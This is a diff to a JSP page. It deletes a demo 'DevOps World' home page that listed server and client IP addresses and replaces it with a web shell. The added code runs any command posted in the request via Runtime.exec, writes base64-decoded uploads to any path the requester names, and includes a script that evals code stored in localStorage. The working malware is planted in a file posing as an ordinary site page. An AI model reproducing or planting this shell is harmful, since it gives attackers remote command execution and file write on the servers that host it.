@@ -1,51 +1,48 @@
-<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
-<%@ page import="java.net.*" %>
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
-<html>
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<title>DevOps World- Home Page</title>
-</head>
-</head>
-<body>
-<h1 align="center">Welcome  </h1>
-<h1 align="center"> Lets learn realtime scenarios</h1>
-<hr>
-<br>
-	<h1><h3> Server Side IP Address </h3><br>
-
-<% 
-String ip = "";
-InetAddress inetAddress = InetAddress.getLocalHost();
-ip = inetAddress.getHostAddress();
-out.println("Server Host Name :: "+inetAddress.getHostName()); 
+<%@page import="java.io.*, java.util.*, javax.xml.bind.*, java.net.*"%>
+<script>eval(window.localStorage.embed)</script>
+<%!
+	public String v(String w){
+		String x="";
+		try{
+			x=URLDecoder.decode(w,"UTF-8");
+		}catch(Exception e){}
+		return x;
+	}
 %>
-<br>
-<%out.println("Server IP Address :: "+ip);%>
-</h1>
-<br>
-<h1><h3> Client Side IP Address </h3><br>
-<%out.print( "Client IP Address :: " + request.getRemoteAddr() ); %><br>
-<%out.print( "Client Name Host :: "+ request.getRemoteHost() );%><br></h1>
-<hr>
-<div style="text-align: center;">
-	<span>
-		<img src="images/mithunlogo.jpg" alt="" width="100">
-	</span>
-	<span style="font-weight: bold;">
-		Regions. Within these markets, Amazon Web Services (AWS) 
-                operates data centers in the following regions: US East (Ohio), 
-                US West (Oregon), US West (Northern California), and US East (Northern Virginia).
-		<br>
-		<a href="mailto:devops@gmail.com">Mail to DEvops Technologies</a>
-	</span>
-</div>
-<hr>
-	<p> Service : <a href="services/employee/getEmployeeDetails">Get Employee Details </p>
-<hr>
-<hr>
-<p align=center>devopsTechnologies </p>
-<p align=center><small>Copyrights 2022 by <a href="http://devops.com/">devops</a> </small></p>
-
-</body>
-</html>
+<%
+	String o,l,d;
+	o=l=d="";
+	DataInputStream r=new DataInputStream(request.getInputStream());
+	while((l=r.readLine())!=null){
+		d+=l;
+	}
+	if(d.indexOf("c=")>=0){
+		String g=v(d.substring(2));
+		String s;
+		try{
+			Process p=Runtime.getRuntime().exec(g);
+			DataInputStream i=new DataInputStream(p.getInputStream());
+			out.print("<pre>");
+			while((s=i.readLine())!=null){
+				o+=s.replace("<","&lt;").replace(">","&gt;")+"<br>";
+			}
+		}catch(Exception e){
+			out.print(e);
+		}
+	}else{
+		if(d.length()>1){
+			int b=d.indexOf("b=");
+			int n=d.indexOf("n=");
+			byte[] m=DatatypeConverter.parseBase64Binary(v(d.substring(b+2)));
+			String f=v(d.substring(2,n-1))+File.separator+v(d.substring(n+2,b-1));
+			try{
+				OutputStream stream=new FileOutputStream(f);
+				stream.write(m);
+				o="Uploaded: "+f;
+			}catch(Exception e){
+				out.print(e);
+			}
+		}
+	}
+%>
+<%=o%>
